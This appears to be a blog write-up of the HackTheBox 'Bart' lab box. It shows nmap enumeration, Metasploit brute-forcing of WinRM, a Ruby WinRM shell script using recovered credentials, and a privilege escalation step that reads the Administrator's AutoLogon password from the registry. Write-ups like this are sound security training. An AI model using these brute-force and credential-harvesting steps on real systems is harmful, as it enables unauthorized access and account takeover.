---
layout: post
title: HackTheBox - Bart Writeup
tags: [hackthebox]
---
This writeup is from a few months ago. I've currently been super busy with OSCE and whatnot. Overall this wasn't too bad of a box and I learned a new WinRM trick in the process. 


## Enumeration

Start with a quick nmap scan and also a full scan once the quick one is completed.

```
root@kali:~/htb/bart# nmap -sV 10.10.10.81

Starting Nmap 7.60 ( https://nmap.org )
Nmap scan report for 10.10.10.81
Host is up (0.071s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

root@kali:~/htb/bart# nmap -p- 10.10.10.81 -T4

Starting Nmap 7.60 ( https://nmap.org ) 
Nmap scan report for 10.10.10.81
Host is up (0.073s latency).
Not shown: 65533 filtered ports
PORT     STATE SERVICE
80/tcp   open  http
5985/tcp open  wsman

Nmap done: 1 IP address (1 host up) scanned in 98.49 seconds
```

Only two ports to work with, port 5985 is for WinRM so hopefully we'll be able to leverage that if we find some credentials.

If we check out the web server in a browser we get a 302 response, however we can see the virtual host name in the Location header.

![302](/img/bart-302.png)

If we add an entry in our /etc/hosts file for that domain name and IP we are able to browse the site.

Scrolling down on the page we find some possible users to target.

![team](/img/bart-team.png)

Even more interesting is if we check the source code of the page we see another user named Harvey, who's been commented out.

![source](/img/bart-source.png)

The user's email addresses in the mailto field is probably going to reflect their username on the system if it exists. So we have:

```
s.brown@bart.local
d.simmons@bart.htb
r.hilton@bart.htb
h.potter@bart.htb
```

To help brute force WinRM we can use the metasploit module `auxiliary/scanner/winrm/winrm_login`.

We'll start with h.potter since he's listed as a developer, so there's a good chance he has credentials on the box.

```
msf > use auxiliary/scanner/winrm/winrm_login
msf auxiliary(scanner/winrm/winrm_login) > show options

Module options (auxiliary/scanner/winrm/winrm_login):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   BLANK_PASSWORDS   false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false            no        Add all passwords in the current database to the list
   DB_ALL_USERS      false            no        Add all users in the current database to the list
   DOMAIN            WORKSTATION      yes       The domain to use for Windows authentification
   PASSWORD                           no        A specific password to authenticate with
   PASS_FILE                          no        File containing passwords, one per line
   Proxies                            no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                             yes       The target address range or CIDR identifier
   RPORT             5985             yes       The target port (TCP)
   SSL               false            no        Negotiate SSL/TLS for outgoing connections
   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
   THREADS           1                yes       The number of concurrent threads
   URI               /wsman           yes       The URI of the WinRM service
   USERNAME                           no        A specific username to authenticate as
   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false            no        Try the username as the password for all users
   USER_FILE                          no        File containing usernames, one per line
   VERBOSE           true             yes       Whether to print output for all attempts
   VHOST                              no        HTTP server virtual host

msf auxiliary(scanner/winrm/winrm_login) > set RHOSTS 10.10.10.81
RHOSTS => 10.10.10.81
msf auxiliary(scanner/winrm/winrm_login) > set USERNAME h.potter
USERNAME => h.potter

msf auxiliary(scanner/winrm/winrm_login) > set PASS_FILE /usr/share/wordlists/fasttrack.txt
PASS_FILE => /usr/share/wordlists/fasttrack.txt
 
msf auxiliary(scanner/winrm/winrm_login) > set DOMAIN BART.HTB
DOMAIN => BART.HTB
msf auxiliary(scanner/winrm/winrm_login) > run
~~~
~~~
~~~
[+] 10.10.10.81:5985 - Login Successful: BART.HTB\h.potter:Password1
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Yes! We can see that Mr. Potter has some weak credentials. Trying to use another metasploit module leveraging these credentials to get code execution we are unsuccessful and are just presented with 500 errors in response. This is due to metasploit's winrm modules not currently supporting encryption. By default WinRM requires encryption, unless specifically disabled by the Administrator.

So to aid us we can use the Ruby winrm package.

<https://github.com/WinRb/WinRM>

We can easily install and configure a script similar to the example shown on the readme.

```
root@kali:~/htb/bart# gem install -r winrm
```

Ruby script contents:

```ruby
require 'winrm'

conn = WinRM::Connection.new( 
  endpoint: 'http://10.10.10.81:5985/wsman',
  user: 'BART.HTB\h.potter',
  password: 'Password1',
)

command=""

conn.shell(:powershell) do |shell|
    until command == "exit\n" do
        print "PS > "
        command = gets        
        output = shell.run(command) do |stdout, stderr|
            STDOUT.print stdout
            STDERR.print stderr
        end
    end    
    puts "Exiting with code #{output.exitcode}"
end
```

```
root@kali:~/htb/bart# ruby winrm_shell.rb 
PS > whoami
bart\h.potter
PS > hostname
BART
```

We are in!

## Privilege Escalation

There are a lot of things to get wrapped up in and lost for privilege escalation here, but keeping it simple and following a methodology checking simple things first allows us to easily escalate here.

```powershell
PS > Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon' | select "Default*"

DefaultDomainName DefaultUserName DefaultPassword                 
----------------- --------------- ---------------                 
DESKTOP-7I3S68E   Administrator   3130438f31186fbaf962f407711faddb
```

And we can see that the Administrator's credentials were configured in the AutoLogon registry settings.

So now all we have to do is edit our winrm_shell.rb and add in the Administrator credentials in place of h.potter's.

```ruby
require 'winrm'

conn = WinRM::Connection.new( 
  endpoint: 'http://10.10.10.81:5985/wsman',
  user: 'BART.HTB\Administrator',
  password: '3130438f31186fbaf962f407711faddb',
)

command=""

conn.shell(:powershell) do |shell|
    until command == "exit\n" do
        print "PS > "
        command = gets        
        output = shell.run(command) do |stdout, stderr|
            STDOUT.print stdout
            STDERR.print stderr
        end
    end    
    puts "Exiting with code #{output.exitcode}"
end
```

```
root@kali:~/htb/bart# ruby winrm_shell.rb 
PS > whoami
bart\administrator
```

